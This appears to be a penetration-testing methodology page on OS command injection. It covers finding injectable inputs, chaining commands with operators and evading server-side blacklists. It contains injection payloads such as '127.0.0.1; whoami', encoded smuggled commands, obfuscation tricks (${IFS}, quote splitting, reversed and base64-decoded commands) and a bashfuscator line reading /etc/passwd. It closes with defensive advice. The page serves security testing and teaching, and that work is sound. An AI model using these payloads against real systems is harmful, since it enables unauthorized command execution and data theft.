---
layout: page
title: "Command Injection"
subtitle: "Injecting operating system commands through application input and evading filters"
permalink: /methodology/web-app/command-injection/
---

Command injection occurs when user input reaches an operating system command, so that the attacker can append their own commands. Languages expose this through functions such as PHP `system()`, `exec()`, `shell_exec()`, `passthru()` and `popen()`, and NodeJS `child_process.exec()` and `spawn()`. The aim is to confirm that a command runs, then determine how far the input is filtered.

## Workflow

1. Identify the function that receives the input. Submit a normal value and compare the output with what the function would print. For a host-checker feature, `127.0.0.1` returning ping output suggests the input is used as:

```bash
ping -c 1 INPUT
```

2. Check where the validation happens. If an error appears without any network request in the developer tools, the check runs in the browser. Replay the request through a proxy with the malicious value. The server is the only place where the check is enforced.

3. Test the operators. Append one operator and a harmless command, and compare the output. Send the URL-encoded form when the input is in a query string or form body:

| Operator | Character | URL encoded | Effect |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands run. Not supported by Windows CMD |
| New line | `\n` | `%0a` | Both commands run |
| Background | `&` | `%26` | Both run. The second output is usually shown first |
| Pipe | `\|` | `%7c` | Only the second output is shown |
| AND | `&&` | `%26%26` | Second runs only if the first succeeds |
| OR | `\|\|` | `%7c%7c` | Second runs only if the first fails |
| Sub-shell | backticks | `%60%60` | Both run. Linux only |
| Sub-shell | `$()` | `%24%28%29` | Both run. Linux only |

Examples:

```text
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1%0a whoami
```

4. Use `||` when the first command must fail. Supply an input that the first command cannot use, then append the second command after `||`, so that only the second command runs.

5. Identify the filter. A message such as "Invalid input" from the application, rather than a shell error, means a server-side blacklist matched. Send one character or word at a time to find what is blocked. Records each blocked item, since the evasion depends on it.

## Filter evasion

| What is blocked | Technique | Example |
|---|---|---|
| Spaces | Tab (`%09`), `${IFS}` or brace expansion | `127.0.0.1%0a%09`, `127.0.0.1%0a{ls,-la}` |
| Operators such as `\|` | Use `<<<` instead of a pipe, or a newline | `bash<<<$(base64 -d<<<STRING)` |
| A command word | Insert quotes (even count, one type) or Linux-only characters `$@` and `\` | `w'h'o'am'i`, `who$@ami`, `w\ho\am\i` |
| Slashes or semicolons | Take a single character from an environment variable | `${PATH:0:1}` gives `/`, `${LS_COLORS:10:1}` gives `;` |
| Lowercase-only commands | Convert case in a sub-shell | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Command words | Reverse the string and execute it | `$(rev<<<'imaohw')` |
| Long or special payloads | Base64-encode and decode inside bash | `echo -n 'COMMAND' \| base64` |

Windows variants use a caret (`^`) inside a command, and PowerShell is case-insensitive, so changing case alone defeats a case-sensitive blacklist.

Evasion tools generate obfuscated payloads when manual work is too slow:

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Invoke-DOSfuscation is the Windows counterpart, used interactively from PowerShell.

## What to look for

- Output that changes after an operator, even if the command is not the one expected.
- Operators allowed while spaces are blocked. Each blocked item needs its own bypass.
- Different responses to the same payload in the browser and in a replayed request. The difference indicates client-side validation.
- A WAF that blocks obfuscated payloads. Note the block and the payload that triggered it.

## Pitfalls

- A space replacement must be URL encoded correctly, or the server reads it as a literal character.
- Mixing quote types breaks the command. The count of each quote type must be even.
- The semicolon fails in Windows CMD but works in PowerShell.
- Long obfuscated payloads can exceed the length limit of the input field. Send them through a proxy.
- A filter that is passed by one payload may still block another. Test each command separately.

> Defense: avoid shell functions, validate input against an allowlist on the server, and run the web server with low privileges. See [Prevention and remediation](/methodology/web-app/prevention/).
{: .info }
